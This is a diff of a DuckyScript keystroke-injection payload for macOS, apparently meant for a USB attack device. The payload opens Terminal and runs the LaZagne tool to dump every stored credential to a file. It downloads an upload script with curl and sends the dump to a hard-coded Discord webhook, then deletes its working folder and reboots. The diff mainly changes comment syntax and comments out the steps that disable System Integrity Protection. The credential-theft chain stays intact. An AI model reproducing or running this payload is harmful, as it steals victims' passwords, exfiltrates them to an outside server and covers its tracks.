@@ -1,22 +1,21 @@
-# Open Terminal
+REM Open Terminal
 DELAY 500
 GUI SPACE
 DELAY 500
 STRING Terminal
 ENTER
 
-# Disable SIP (System Integrity Protection)
-DELAY 500
-STRING csrutil disable
-ENTER
-DELAY 1000
-STRING reboot
-ENTER
+REM Disable SIP (System Integrity Protection)
+REM DELAY 500
+REM STRING csrutil disable
+REM ENTER
+REM DELAY 1000
+REM STRING reboot
+REM ENTER
+REM Wait for the system to restart (adjust the delay as needed)
+REM DELAY 10000
 
-# Wait for the system to restart (adjust the delay as needed)
-DELAY 10000
-
-# Download and run Lazagne for macOS
+REM Download and run Lazagne for macOS
 STRING mkdir ~/Downloads/tmp
 ENTER
 STRING cd ~/Downloads/tmp
@@ -32,27 +31,27 @@ ENTER
 STRING ./LaZagne.py all > output.txt
 ENTER
 
-# Define Discord webhook URL
+REM Define Discord webhook URL
 STRING DISCORD_WEBHOOK="https://discord.com/api/webhooks/1207911611650547732/XlR8PqioDTgKoWdNsFc9sOYD9xZhs6_cmT9xH3ZRdt3CgDsHJVw3lQMaxqsX9J4KWetv"
 
 
-# Download Discord-Upload-Mac.sh
+REM Download Discord-Upload-Mac.sh
 STRING curl -O https://raw.githubusercontent.com/QuackBeans/flipper/main/Discord-Upload-Mac.sh
 ENTER
 STRING chmod +x Discord-Upload-Mac.sh
 ENTER
 
-# Run Discord-Upload-Mac.sh with the defined webhook URL and output.txt
+REM Run Discord-Upload-Mac.sh with the defined webhook URL and output.txt
 STRING ./Discord-Upload-Mac.sh "$DISCORD_WEBHOOK" output.txt
 ENTER
 
 
-# Clean up
+REM Clean up
 STRING cd ~
 ENTER
 STRING rm -rf ~/Downloads/tmp
 ENTER
 
-# Enable SIP (System Integrity Protection) - Restart required
+REM Enable SIP (System Integrity Protection) - Restart required
 STRING reboot
 ENTER
